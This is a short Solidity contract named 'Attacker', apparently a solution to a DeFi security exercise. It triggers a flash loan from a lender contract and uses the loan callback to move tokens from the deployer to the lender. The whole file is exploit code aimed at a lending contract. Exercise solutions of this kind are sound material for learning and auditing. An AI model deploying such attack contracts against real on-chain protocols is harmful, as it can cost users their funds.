//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface ILender {
    function flashLoan(uint256 borrowAmount) external;
}

contract Attacker {
    ILender lender;
    address attacker;

    constructor(address _lender) {
        lender = ILender(_lender);
        attacker = msg.sender;
    }

    function exploit() public {
        lender.flashLoan(1);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(IERC20(tokenAddress).transferFrom(attacker, address(lender), amount + 1), "Transfer of tokens failed");
    }
}